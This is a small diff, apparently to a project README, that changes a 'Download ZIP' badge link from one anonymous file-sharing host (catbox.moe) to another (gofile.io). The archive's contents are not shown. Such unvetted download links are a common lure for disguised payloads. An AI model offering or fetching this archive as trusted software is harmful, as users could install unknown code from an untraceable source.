@@ -33,7 +33,7 @@
 
 
 <div align="center">
-  <a href="https://files.catbox.moe/o5sv6j.zip">
+  <a href="https://gofile.io/d/59fxwI">
     <img src="https://img.shields.io/badge/Download%20ZIP-808080?style=for-the-badge&logo=archive&logoColor=white" width="250" />
   </a>
 </div>
